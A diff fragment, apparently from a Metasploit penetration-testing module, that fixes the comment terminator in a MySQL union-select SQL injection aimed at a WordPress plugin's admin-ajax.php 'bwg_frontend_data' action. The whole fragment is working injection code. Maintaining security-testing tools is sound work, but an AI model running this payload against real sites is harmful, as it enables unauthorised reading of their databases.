@@ -56,7 +56,7 @@ class MetasploitModule < Msf::Auxiliary
     create_sqli(dbms: MySQLi::Common, opts: { hex_encode_strings: true }) do |payload|
       expr = payload.to_s.gsub(/\s+/, ' ').strip
       cols = Array.new(23) { |i| i == 7 ? "(#{expr})" : rand(1000..9999).to_s }
-      injected = ")\" union select #{cols.join(',')} -- -g"
+      injected = ")\" union select #{cols.join(',')} -- -"
       endpoint = normalize_uri(datastore['TARGETURI'], 'wp-admin', 'admin-ajax.php')
       params = {
         'action' => 'bwg_frontend_data',
